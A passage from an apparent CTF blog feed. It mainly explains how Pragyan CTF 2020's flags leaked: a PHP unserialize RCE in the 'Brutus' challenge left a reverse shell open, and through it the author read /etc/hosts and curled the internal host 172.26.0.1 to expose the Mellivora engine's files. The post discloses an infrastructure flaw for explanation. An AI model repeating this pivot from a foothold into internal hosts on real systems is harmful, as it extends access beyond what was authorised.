rel="noopener">https://simple-todos-6c7bf285.challenges.bsidessf.net</a></p></blockquote><p>This is the challenge about Information Disclosure using WebSocket. The private message does not appear on the screen, but it sends it to the client without any special permission settings. This allows you to view a private message simply by checking the web socket communications history.</p><p><img src="/img/2020/02/image-20200225222310259.png" alt="image-20200225222310259"></p><p><img src="/img/2020/02/image-20200225222317282.png" alt="image-20200225222317282"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BSidesSF CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How Pragyan CTF 2020 hacked</title>
      <link href="/how-pragyan-ctf-2020-hacked/"/>
      <url>/how-pragyan-ctf-2020-hacked/</url>
      
        <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p><img src="/img/2020/02/image-20200223041326135-1.png" alt="image-20200223041326135"></p><p>First of all, I hope there is no misunderstanding, I didn’t abused the server.<br>During the toss of insomnia, I saw all the flags leaked of the ongoing CTF in CTFTime.<br>Using the reverse shell that was left open through the web challenge a few hours ago, I was able to identify all the causes 10 minutes after the server went down.</p><p>It’s not so technical, but I decided to write this down to show explanation for the dumbfounded participants.</p><h2 id="Cause"><a href="#Cause" class="headerlink" title="Cause"></a>Cause</h2><p>The web challenge <code>Brutus</code> has a vulnerability in <code>PHP unserialize</code>.<br>And It gives remote code execution RCE Privileges to user.</p><p><img src="/img/2020/02/image-20200223041726382.png" alt="img"></p><p>This vuln allows us to create a reverse shell, and It doesn’t have a time-out check.<br>Even after five hours from solved the problem, the connection was still there.<br>Thanks to that, analysis was very comfortable.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@5841bda2da57:/code$ cat /etc/hosts</span><br><span class="line">127.0.0.1       localhost</span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0 ip6-localnet</span><br><span class="line">ff00::0 ip6-mcastprefix</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br><span class="line">172.26.0.4      5841bda2da57</span><br></pre></td></tr></table></figure><p>By the <code>/etc/hosts</code> file allows you to check the internal IP address of the challenge server is <code>172.26.0.4</code>.<br>If not specifically managed, so I can expect the address of the host server is <code>172.26.0.1</code> or around that.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">www-data@5841bda2da57:/code$ curl 172.26.0.1</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">HTML</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//W3C//DTD HTML 3.2 Final//EN"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Index of /<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Index of /<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">valign</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/icons/blank.gif"</span> <span class="attr">alt</span>=<span class="string">"[ICO]"</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?C=N;O=D"</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?C=M;O=A"</span>&gt;</span>L</span><br><span class="line">ast modified<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?C=S;O=A"</span>&gt;</span>Size<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?C=D;O=A"</span>&gt;</span>Description<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">"5"</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/icons/folder.gif"</span> <span class="attr">alt</span>=<span class="string">"[DIR]"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"mellivora/"</span>&gt;</span>mellivora/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span></span><br><span class="line">2020-02-21 22:08  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>  - <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">"5"</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>Apache/2.4.29 (Ubuntu) Server at 172.26.0.1 Port 80<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>It seems that a web server works on <code>172.26.0.1</code>.</p><p>Here you can see one folder, and you can see that it’s using the Melivora CTF engine through its name and internal files.</p><ul><li><a href="https://github.com/Nakiami/mellivora" target="_blank" rel="noopener">https://github.com/Nakiami/mellivora</a></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">www-data@5841bda2da57:/code$ curl 172.26.0.1/mellivora/</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">HTML</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//W3C//DTD HTML 3.2 Final//EN"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Index of /mellivora<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Index of /mellivora<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">valign</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/icons/blank.gif"</span> <span class="attr">alt</span>=<span class="string">"[ICO]"</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?C=N;O=D"</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?C=M;O=A"</span>&gt;</span>Last modified<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?C=S;O=A"</span>&gt;</span>Size<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?C=D;O=A"</span>&gt;</span>Description<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">"5"</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/icons/back.gif"</span> <span class="attr">alt</span>=<span class="string">"[PARENTDIR]"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span>Parent Directory<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>  - <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/icons/unknown.gif"</span> <span class="attr">alt</span>=<span class="string">"[   ]"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"Dockerfile"</span>&gt;</span>Dockerfile<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>2020-02-17 12:37  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>720 <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/icons/unknown.gif"</span> <span class="attr">alt</span>=<span class="string">"[   ]"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"LICENSE"</span>&gt;</span>LICENSE<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>2020-02-17 12:37  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span> 34K<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/icons/text.gif"</span> <span class="attr">alt</span>=<span class="string">"[TXT]"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"README.md"</span>&gt;</span>README.md<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>2020-02-17 12:37  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>2.8K<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/icons/text.gif"</span> <span class="attr">alt</span>=<span class="string">"[TXT]"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"benchmarks.md"</span>&gt;</span>benchmarks.md<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>2020-02-17 12:37  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>6.4K<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/icons/unknown.gif"</span> <span class="attr">alt</span>=<span class="string">"[   ]"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"codeception.yml"</span>&gt;</span>codeception.yml<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>2020-02-17 12:37  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>340 <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/icons/unknown.gif"</span> <span class="attr">alt</span>=<span class="string">"[   ]"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"composer.json"</span>&gt;</span>composer.json<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>2020-02-17 12:37  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>696 <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/icons/unknown.gif"</span> <span class="attr">alt</span>=<span class="string">"[   ]"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"composer.lock"</span>&gt;</span>composer.lock<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>2020-02-17 12:37  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>106K<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/icons/unknown.gif"</span> <span class="attr">alt</span>=<span class="string">"[   ]"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"docker-compose.dev.yml"</span>&gt;</span>docker-compose.dev.yml<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>2020-02-22 06:35  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>1.1K<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/icons/unknown.gif"</span> <span class="attr">alt</span>=<span class="string">"[   ]"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"docker-compose.test.yml"</span>&gt;</span>docker-compose.test.yml<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>2020-02-17 12:37  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>1.2K<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/icons/folder.gif"</span> <span class="attr">alt</span>=<span class="string">"[DIR]"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"htdocs/"</span>&gt;</span>htdocs/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>2020-02-17 12:37  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>  - <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/icons/folder.gif"</span> <span class="attr">alt</span>=<span class="string">"[DIR]"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"include/"</span>&gt;</span>include/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>2020-02-20 13:35  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>  - <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/icons/folder.gif"</span> <span class="attr">alt</span>=<span class="string">"[DIR]"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"install/"</span>&gt;</span>install/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>2020-02-17 12:37  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>  - <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/icons/text.gif"</span> <span class="attr">alt</span>=<span class="string">"[TXT]"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"rules.txt"</span>&gt;</span>rules.txt<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>2020-02-21 22:08  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>826 <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/icons/folder.gif"</span> <span class="attr">alt</span>=<span class="string">"[DIR]"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"tests/"</span>&gt;</span>tests/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>2020-02-17 12:37  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span>&gt;</span>  - <span 